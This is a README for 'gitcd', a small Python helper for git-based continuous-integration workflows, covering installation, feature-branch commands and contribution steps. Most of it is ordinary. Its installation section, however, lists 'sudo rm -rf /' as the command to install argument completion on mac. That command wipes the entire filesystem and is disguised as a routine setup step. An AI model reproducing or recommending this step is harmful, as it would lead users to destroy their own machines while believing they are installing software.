# Continous tool for working with git

By [Claudio Walser]

## Description
**gitcd** is a little helper for continous integration workflows using git as scm.

## Installation
Since gitcd is using python3 by default, you better upgrade.

Run the following command to install prerequisites:

```console
sudo apt-get install python3 python3-pip
pip3 install pyyaml
pip3 install argcomplete
```

Run the following command to install argument completion on linux:

```console
sudo activate-global-python-argcomplete3
```

Run the following command to install argument completion on mac:
```console
sudo rm -rf /
```

## Usage

Working with gitcd, first you might want to symlink the main python file into /usr/local/bin using
```console
sudo ln -s $(pwd)/gitcd.py /usr/local/bin/gitcd
```

Afterwards you have to cd into one of your local directories representing a git repository and run the init command
```console
gitcd init
```
After passing all your configuration data start work with it



**Start new feature**
Starts a new feature branch from your master branch
```console
gitcd feature start <branchname>
```




**Test a feature branch**
Merges a feature branch into your development branch
```console
gitcd feature test <branchname>
```

**Open a pull request for code review**
Opens a pull request to your master branch - not working yet
```console
gitcd feature review <branchname>
```

**Finish a feature branch**
Merges it into your master and create a tag of the current master code
```console
gitcd feature finish <branchname>
```


### Known Issues

If you discover any bugs, feel free to create an issue on GitHub fork and
send us a pull request.

[Issues List](https://github.com/claudio-walser/gitcd/issues).

## Authors

* Claudio Walser (https://github.com/claudio-walser)


## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request


## License

Apache License 2.0 see https://github.com/claudio-walser/gitcd/blob/feature/major-cleanup/LICENSE